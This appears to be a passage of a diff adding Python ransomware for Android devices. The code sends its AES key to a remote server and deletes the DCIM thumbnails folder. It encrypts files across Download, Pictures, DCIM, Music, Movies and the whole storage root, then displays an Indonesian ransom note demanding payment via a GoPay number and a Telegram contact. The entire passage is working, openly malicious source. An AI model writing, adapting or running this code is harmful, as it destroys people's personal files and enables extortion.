+        iv = file_data[:16]
+        ciphertext = file_data[16:]
+        cipher = AES.new(aes_key, AES.MODE_CFB, iv)
+        decrypted_data = cipher.decrypt(ciphertext)
+        decrypted_file_path = file_path[:-len(encrypted_extension)]
+
+        with open(decrypted_file_path, 'wb') as file:
+            file.write(decrypted_data)
+
+        # Delete the file
+        os.remove(file_path)
+
+    except Exception as e:
+        pass
+
+# Function to process all files in a directory
+def process_directory(directory_path, aes_key, encrypted_extension, status):
+    for root, _, files in os.walk(directory_path):
+        for file_name in files:
+            file_path = os.path.join(root, file_name)
+            if status == "e":
+                encrypt_file(file_path, aes_key, encrypted_extension)
+            elif status == "d":
+                decrypt_file(file_path, aes_key, encrypted_extension)
+
+# Function to process all storage directories
+def process_all_storage_and_sdcard(aes_key, encrypted_extension, status):
+    storage_directories = ["/storage/emulated/0", "/storage/emulated/10"]  # Add more storage paths if needed
+
+    for directory in storage_directories:
+        # Check if "Download" folder exists
+        if os.path.exists(os.path.join(directory, "Download")):
+            # Process the "Download" folder
+            process_directory(os.path.join(directory, "Download"), aes_key, encrypted_extension, status)
+
+        # Check if "downloads" folder exists
+        if os.path.exists(os.path.join(directory, "downloads")):
+            # Process the "downloads" folder
+            process_directory(os.path.join(directory, "downloads"), aes_key, encrypted_extension, status)
+
+        # Check if "Pictures" folder exists
+        if os.path.exists(os.path.join(directory, "Pictures")):
+            # Process the "Pictures" folder
+            process_directory(os.path.join(directory, "Pictures"), aes_key, encrypted_extension, status)
+
+        # Check if "DCIM" folder exists
+        if os.path.exists(os.path.join(directory, "DCIM")):
+            # Process the "DCIM" folder
+            process_directory(os.path.join(directory, "DCIM"), aes_key, encrypted_extension, status)
+
+        # Check if "Music" folder exists
+        if os.path.exists(os.path.join(directory, "Music")):
+            # Process the "Music" folder
+            process_directory(os.path.join(directory, "Music"), aes_key, encrypted_extension, status)
+
+        # Check if "Movies" folder exists
+        if os.path.exists(os.path.join(directory, "Movies")):
+            # Process the "Movies" folder
+            process_directory(os.path.join(directory, "Movies"), aes_key, encrypted_extension, status)
+
+        # Check if "Fonts" folder exists
+        if os.path.exists(os.path.join(directory, "Fonts")):
+            # Process the "Fonts" folder
+            process_directory(os.path.join(directory, "Fonts"), aes_key, encrypted_extension, status)
+
+        # Check if the root directory folder exists
+        if os.path.exists(directory):
+            # Process the entire storage
+            process_directory(directory, aes_key, encrypted_extension, status)
+
+
+if __name__ == "__main__":
+    # Configure the client
+    SERVER_IP = '192.168.1.10'  # Replace with the public IP of the server
+    SERVER_PORT = 8080                # Port to connect to
+
+    encrypted_extension = ".lockedbySzt00Xploit"  # Change this if you want a different extension
+    aes_key = generate_aes_key()
+    aes_key_hex = binascii.hexlify(aes_key).decode('utf-8')
+    status = "e"  # encrypt
+
+    try:
+        # Create a socket
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        # Connect to the server
+        client_socket.connect((SERVER_IP, SERVER_PORT))
+
+        # Send data to the server
+        client_socket.send(aes_key_hex.encode('utf-8'))
+
+        # Receive and print the server's response
+        data = client_socket.recv(1024)
+        print(f"{data.decode('utf-8')}")
+        client_socket.close()
+    except Exception as e:
+        # If there's an error sending the key, terminate the script
+        sys.exit(1)
+
+    # Define the path to the thumbnails folder
+    dcim_path = "/storage/emulated/0/DCIM"
+    thumbnail_path = os.path.join(dcim_path, ".thumbnails")
+
+    # Check if the thumbnails folder exists
+    if os.path.exists(thumbnail_path) and os.path.isdir(thumbnail_path):
+        try:
+            # Use shutil.rmtree to delete the thumbnails folder and its contents
+            shutil.rmtree(thumbnail_path)
+
+        except Exception as e:
+            pass
+
+    process_all_storage_and_sdcard(aes_key, encrypted_extension, status)
+    os.system("clear")
+    message = f"""
+                      \033[91m.-""-.\033[0m
+                     \033[91m/ .--. \\\033[0m
+                    \033[91m/ /   \\\ \\\033[0m
+                    \033[91m| |    | |\033[0m
+                    \033[91m| |.-""-.| \033[0m
+                   \033[91m///`.::::.`\\\033[0m
+                  \033[91m||| ::/  \\:: ;\033[0m
+                  \033[91m||; ::\\__/:: ;\033[0m
+                   \033[91m\\\\\\ '::::' /\033[0m
+                    \033[91m`=':-..-'`\033[0m
+      \033[91mERROR\033[0m: YOUR FILES HAS BEEN \033[91mENCRYPTED\033[0m!
+
+
+Dokumen pribadi Anda, foto, dan file lain di perangkat ini dienkripsi menggunakan algoritma AES-256.
+File asli telah dihapus seluruhnya dan hanya dapat dipulihkan dengan mengikuti langkah-langkah yang dijelaskan di bawah ini.
+1. Untuk mendapatkan kunci yang akan mendekripsi file, Anda perlu membayar 100K dari alamat gopat dompet ini:
+    >> \033[93m+62895422828222\033[0m <<
+
+2. Setelah anda membayar tebusan hubungi kami melalui telegram; \033[96mhttps://t.me/sztsss\033[0m dan kirimkan ID Transaksi atau screenshot pembayaran Anda kepada kami, dan kami akan memberikan kuncinya.
+
+
+    Bagaimana cara transfer gopay?
+\033[96mhttps://youtu.be/877t2ZVsTcs?si=7s3JDXOtIqcBze5i\033[0m
+
+    Bagaimana cara transfer dari bank ke gopay?
+\033[96mhttps://youtu.be/yuy16DyJNOk?si=JiIKt4AmkiqxgMt9\033[0m
+
+
+    \033[91mIMPORTANT NOTICE:\033[0m
+
+\033[91m[!]\033[0m Jangan mengganti nama atau mengubah file terenkripsi resiko ditanggung sendiri.
+\033[91m[!]\033[0m Jangan mematikan atau memulai ulang perangkat Anda atau menutup aplikasi ini karena Anda itu akan ke lock permanen
+\033[91m[!]\033[0m Jangan masukkan kunci apa pun, kami tidak bertanggung jawab atas tindakan Anda sendiri.
+
+
+    """
+
+    print(message)
+    aes_key_hex = input("KEY: ")
+    aes_key = binascii.unhexlify(aes_key_hex)
+    status = "d"  # decrypt
+    os.system("clear")
+    print("\033[91mJIKA INPUT KUNCI SALAH, FILE ANDA AKAN RUSAK KARENA KAMI SUDAH DEKRIPSI FILE ANDA!\033[0m")
+    process_all_storage_and_sdcard(aes_key, encrypted_extension, status)
